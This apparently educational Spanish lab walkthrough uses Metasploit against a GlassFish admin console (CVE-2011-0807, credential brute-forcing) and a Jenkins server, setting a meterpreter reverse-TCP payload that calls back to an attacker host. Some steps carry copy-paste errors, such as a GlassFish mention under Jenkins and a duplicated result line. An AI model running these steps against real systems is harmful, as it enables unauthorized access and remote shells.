# Vulnerabilidades Windows

## CVE-2011-0807 GlassFish


1. Primero vemos que puertos tiene la maquina victima con nmap

   ```bash
   nmap 169.254.217.145
   
2. Ahora iniciaremos la herramienta  msfconsole que es el Framework mas famoso

   ```bash
   msfconsole
   
3. Buscamos las herramientas que tiene que ver con Glassfish
   ```bash
   search glassfish

4. Yo usare la 1 
   ```bash
   use 1

5. Vemos que opciones hay que rellenar 
   ```bash
   show options
6. Seteamos los campos necesario
   ```bash
   set rhost 10.10.0.1
   set rport 4848
   set STOP_ON_SUCCES  true
   set user_file /home/kali/Desktop/user.txt
   set pass_file /home/kali/Desktop/passw.txt
7. Y ejecutamos el exploit
   ```bash
   exploit
8. Y como podemos ver el usuario es admin y la contraseña exploit
![exWind](https://github.com/ajaicac/Seguridad/blob/main/img/exWiN.PNG)


## Jenkins 8484 - HTTP


1. Primero vemos que puertos tiene la maquina victima con nmap

   ```bash
   nmap 169.254.217.145
   
2. Ahora iniciaremos la herramienta  msfconsole que es el Framework mas famoso

   ```bash
   msfconsole
   
3. Buscamos las herramientas que tiene que ver con Glassfish
   ```bash
   search jenkins

4. Yo usare la 11 
   ```bash
   use 11

5. Vemos que opciones hay que rellenar 
   ```bash
   show options
6. Seteamos los campos necesario
   ```bash
   set rhosts 169.254.217.145
   set rport 8484
   set targeturi /
   set srvhost 169.254.217.146
   set target 0ç
   set payload windows/meterpreter/reverse_tcp
7. Y ejecutamos el exploit
   ```bash
   exploit
8. Y como podemos ver el usuario es admin y la contraseña exploit
![exWind](https://github.com/ajaicac/Seguridad/blob/main/img/exJenkinsWiN.PNG)

